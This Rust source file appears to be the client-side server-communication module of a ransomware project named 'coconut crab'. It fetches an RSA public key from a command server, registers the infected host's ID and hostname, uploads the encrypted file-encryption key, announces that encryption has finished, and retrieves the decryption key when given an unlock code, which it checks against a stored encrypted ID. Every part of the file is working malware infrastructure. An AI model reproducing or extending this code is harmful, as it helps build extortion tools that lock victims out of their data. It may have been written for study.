use rsa::{ RsaPublicKey, pkcs1::{ DecodeRsaPublicKey, EncodeRsaPublicKey } };
use std::{ fs, path::PathBuf, str };
use hex::FromHex;
use log::{ debug, error, info };

use coconut_crab_lib::{
    web::{
        client::{ web_get_recv_bytes, web_post_send_json_recv_text },
        structs::{ Registration, UploadSymKey, AnnounceCompletion, DownloadSymKey },
        validate::create_proof,
    },
    file::write_to_file,
};
use crate::status::Status;
use crate::crypto::decrypt_string;

pub fn write_asym_pub_key_to_disk(asym_pub_key: &RsaPublicKey, file_path: &PathBuf) {
    let pem_data = match asym_pub_key.to_pkcs1_pem(rsa::pkcs8::LineEnding::LF) {
        Ok(pem_data_result) => {
            debug!("Successfully converted public key to PEM data: {}", pem_data_result);
            pem_data_result
        }
        Err(pem_data_result) => {
            error!("Unable to convert public key to PEM data: {}", pem_data_result);
            return;
        }
    };
    match write_to_file(pem_data.as_bytes(), file_path) {
        Ok(_) => {
            info!("Successfully wrote PEM data to file: {:?}", file_path);
        }
        Err(file_write_result) => {
            error!("Failed to write PEM data to file: {}", file_write_result);
        }
    };
}

#[allow(dead_code)]
pub fn import_asym_pub_key(file_path: &PathBuf) -> RsaPublicKey {
    let pem = fs::read_to_string(file_path).expect("Failed to read PEM file");
    debug!("Read public key PEM data {}", pem);
    let public_key = RsaPublicKey::from_pkcs1_pem(&pem).expect("Failed to parse PEM public key");
    debug!("Parsed PEM to public key {:?}", public_key);
    public_key
}

pub fn download_asym_pub_key(
    server_fqdn: &str,
    port: &u16,
    https: &bool,
    verify_server: &bool
) -> RsaPublicKey {
    let identifier = if *https { "https" } else { "http" };
    let url = format!("{}://{}:{}/download/asym-pub-key.pem", identifier, server_fqdn, port);
    debug!("Asymmetric public key download URL: {}", url);
    let content = web_get_recv_bytes(&url, verify_server).expect("Unable to get content");
    debug!("Response content bytes: {:?}", content);
    let public_key = RsaPublicKey::from_pkcs1_pem(
        str::from_utf8(&content).expect("Failed to parse PEM key string")
    ).expect("Failed to parse PEM key");
    debug!("Asymmetric public key downloaded: {:?}", public_key);
    public_key
}

pub fn register(
    server_fqdn: &str,
    port: &u16,
    status: &Status,
    secret: &str,
    https: &bool,
    verify_server: &bool
) {
    let identifier = if *https { "https" } else { "http" };
    let url = format!("{}://{}:{}/register", identifier, server_fqdn, port);
    debug!("Registration URL: {}", url);
    let mut proof_source = [status.id.as_bytes(), status.hostname.as_bytes()].concat();
    debug!("Proof source: {:?}", proof_source);
    let registration = Registration {
        id: status.id.clone(),
        hostname: status.hostname.clone(),
        proof: create_proof(&mut proof_source, secret),
    };
    debug!("Registration data: {:?}", registration);
    let content = web_post_send_json_recv_text(&url, &registration, verify_server).expect(
        "Unable to get content"
    );
    debug!("Response content text: {}", content);
    assert_eq!(content, "Success");
}

pub fn upload_sym_key(
    server_fqdn: &str,
    port: &u16,
    status: &Status,
    secret: &str,
    https: &bool,
    verify_server: &bool
) {
    let identifier = if *https { "https" } else { "http" };
    let url = format!("{}://{}:{}/upload-sym-key", identifier, server_fqdn, port);
    debug!("Symmetric key upload URL: {}", url);
    let mut proof_source = [
        status.id.as_bytes(),
        status.asymmetrically_encrypted_symmetric_key.as_bytes(),
    ].concat();
    debug!("Proof source: {:?}", proof_source);
    let uploadsymkey = UploadSymKey {
        id: status.id.clone(),
        key: status.asymmetrically_encrypted_symmetric_key.clone(),
        proof: create_proof(&mut proof_source, secret),
    };
    debug!("Symmetric key upload data: {:?}", uploadsymkey);
    let content = web_post_send_json_recv_text(&url, &uploadsymkey, verify_server).expect(
        "Unable to get content"
    );
    debug!("Response content text: {}", content);
    assert_eq!(content, "Success");
    info!("Successfully uploaded symmetric key");
}

pub fn announce_completion(
    server_fqdn: &str,
    port: &u16,
    status: &Status,
    secret: &str,
    https: &bool,
    verify_server: &bool
) {
    let identifier = if *https { "https" } else { "http" };
    let url = format!("{}://{}:{}/announce-completion", identifier, server_fqdn, port);
    debug!("Completion announcement URL: {}", url);
    let mut proof_source = status.id.as_bytes().to_vec();
    debug!("Proof source: {:?}", proof_source);
    let announcecompletion = AnnounceCompletion {
        id: status.id.clone(),
        proof: create_proof(&mut proof_source, secret),
    };
    debug!("Completion announcement data: {:?}", announcecompletion);
    let content = web_post_send_json_recv_text(&url, &announcecompletion, verify_server).expect(
        "Unable to get content"
    );
    debug!("Response content text: {}", content);
    assert_eq!(content, "Success");
    info!("Successfully announced completion");
}

fn download_sym_key(
    server_fqdn: &str,
    port: &u16,
    status: &Status,
    code: &str,
    secret: &str,
    https: &bool,
    verify_server: &bool
) -> Option<[u8; 32]> {
    let identifier = if *https { "https" } else { "http" };
    let url = format!("{}://{}:{}/download-sym-key", identifier, server_fqdn, port);
    debug!("Symmetric key download URL: {}", url);
    let mut proof_source = [status.id.as_bytes(), code.as_bytes()].concat();
    debug!("Proof source: {:?}", proof_source);
    let downloadsymkey = DownloadSymKey {
        id: status.id.clone(),
        code: code.to_string(),
        proof: create_proof(&mut proof_source, secret),
    };
    debug!("Symmetric key download data: {:?}", downloadsymkey);
    let content = web_post_send_json_recv_text(&url, &downloadsymkey, verify_server).expect(
        "Unable to get content"
    );
    debug!("Response content text: {}", content);
    let sym_key = match <[u8; 32]>::from_hex(content) {
        Ok(sym_key_result) => {
            debug!("Successfuly got symmetric key from response: {:?}", sym_key_result);
            sym_key_result
        }
        Err(sym_key_result) => {
            error!("Text is not symmetric key: {:?}", sym_key_result);
            return None;
        }
    };
    Some(sym_key)
}

pub fn get_sym_key(
    server_fqdn: &str,
    server_port: &u16,
    status: &Status,
    code: &str,
    preshared_secret: &str,
    https: &bool,
    verify_server: &bool
) -> Option<[u8; 32]> {
    match
        download_sym_key(
            server_fqdn,
            server_port,
            status,
            code,
            preshared_secret,
            https,
            verify_server
        )
    {
        Some(sym_key_result) => {
            debug!("Server sent back a valid symmetric key: {:?}", sym_key_result);
            let decrypt_id_attempt = decrypt_string(
                &status.symmetrically_encrypted_id,
                &sym_key_result,
                &status.symmetrically_encrypted_id_nonce
            );
            debug!(
                "Comparing server provided key decrypted ID ({}) to known ID ({})",
                decrypt_id_attempt,
                status.id
            );
            if decrypt_id_attempt == status.id {
                info!("Received correct symmetric key from server");
                Some(sym_key_result)
            } else {
                error!("Received incorrect symmetric key from server");
                None
            }
        }
        None => {
            info!("Server did not send back a valid symmetric key");
            None
        }
    }
}
